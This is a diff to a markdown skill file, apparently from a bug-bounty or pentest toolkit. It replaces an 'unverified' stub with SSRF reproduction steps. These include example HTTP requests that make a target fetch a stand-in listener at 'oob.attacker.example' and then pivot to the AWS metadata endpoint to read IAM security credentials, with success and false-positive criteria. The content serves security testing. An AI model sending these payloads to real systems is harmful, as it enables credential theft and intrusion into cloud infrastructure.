@@ -1,8 +1,5 @@
 ---
-# bughive-repro-start
-cve: null
-repro: unverified
-# bughive-repro-end
+repro: technique-authored
 ---
 
 # SKILL: ssrf
@@ -38,11 +35,44 @@ http://google.com:11211:80/
 ## Triage
 Metadata → Critical. Internal scan → High. Callback → Med.
 
-<!-- bughive-repro-start -->
 ## Steps to reproduce
 
-> Status: `repro: unverified` — no CVE was resolved for this skill. Nothing below was invented.
 
-### What's missing
-- no CVE/target in skill; needs teardown or stays unverified
-<!-- bughive-repro-end -->
+> Status: `repro: technique-authored` — authored and reviewed for correctness against the SSRF class. Not executed against a live host; live confirmation needs an in-scope target.
+
+
+### Preconditions
+- An endpoint fetches a URL supplied by the user server-side (see `## Trigger Params`: `url`, `webhook_url`, `callback`, `image_url`, `import_from`, PDF/HTML render inputs).
+- You control an external listener/collaborator host that logs inbound requests (for out-of-band confirmation).
+
+
+### Steps
+1. Point the parameter at a unique attacker-controlled URL and confirm the server (not your browser) makes the request by watching your listener.
+2. Then pivot the parameter to an internal/metadata target and capture the response or its side effects.
+
+
+Example request (placeholder host `TARGET`, listener `oob.attacker.example`):
+```
+POST /api/fetch HTTP/1.1 Host: TARGET Content-Type: application/json
+
+
+{"url":"http://oob.attacker.example/ssrf-<UNIQUE_TOKEN>"}
+
+
+```
+Internal/metadata pivot (AWS IMDSv1 example):
+```
+POST /api/fetch HTTP/1.1 Host: TARGET Content-Type: application/json
+
+
+{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
+
+
+```
+### Success condition (machine-checkable)
+- Out-of-band: your listener logs an inbound HTTP request for the exact `<UNIQUE_TOKEN>` path, originating from the target's egress IP (not your test client) — proves server-side fetch.
+- In-band: the API response body contains data only reachable from inside the target's network — e.g. the IMDS path returns an IAM role name / credential JSON, or an internal-only service banner. Either signal confirms SSRF.
+
+
+### False-positive guard
+- NOT SSRF if the request to your listener comes from the client/browser IP (that is client-side redirect/fetch), if the server only validates the URL without fetching (no listener hit), or if the endpoint returns a canned error for non-allowlisted hosts. A 200 with an empty/error body and no listener hit and no internal data is not confirmation.
